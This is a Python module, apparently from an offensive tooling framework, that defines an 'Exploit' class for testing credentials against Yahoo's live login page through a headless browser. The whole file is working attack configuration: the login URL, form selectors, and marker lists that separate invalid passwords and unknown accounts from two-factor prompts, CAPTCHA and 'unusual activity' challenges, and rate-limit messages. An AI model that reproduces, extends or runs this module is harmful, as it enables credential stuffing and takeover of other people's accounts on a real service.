"""Yahoo Credential Tester — headless-browser login flow."""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Yahoo Credential Tester"
    description = "Tests credentials against Yahoo login via a headless browser."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "yahoo"
    browser_login_url = "https://login.yahoo.com/"
    username_selector = "input[name=username]"
    username_submit_selector = "button[type=submit]"
    password_selector = "input[name=passwd]"
    submit_enter = True
    submit_selectors = ("button[type=submit]", "input[type=submit]")
    browser_login_paths = ("/",)
    twofa_markers = (
        "two-step verification", "two-step", "two-factor", "2fa",
        "verification code", "enter the code", "confirm it's you",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "are you a robot",
        "we've noticed some unusual", "confirm it's you", "verify it's you",
    )
    rate_markers = (
        "too many attempts", "try again later", "temporarily", "rate limit",
        "sign-in limits", "many attempts",
    )
    invalid_markers = (
        "invalid id or password", "invalid password", "incorrect password",
        "wrong password", "that id doesn't look right", "password you entered is incorrect",
        "account not found", "doesn't exist", "we don't recognize this email",
        "we don't recognize this phone", "don't recognize this email",
    )
